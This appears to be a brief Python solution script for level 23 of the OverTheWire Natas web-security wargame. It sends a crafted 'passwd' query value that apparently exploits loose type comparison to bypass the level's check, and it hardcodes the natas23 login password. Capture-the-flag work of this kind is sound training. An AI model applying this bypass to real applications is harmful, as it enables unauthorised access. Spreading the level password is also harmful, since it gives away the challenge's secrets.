import requests

URL = "http://natas23.natas.labs.overthewire.org/?passwd=1234iloveyou" 
CREDS = ("natas23", "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE")

print(requests.get(URL, auth=CREDS, allow_redirects=False).text) 
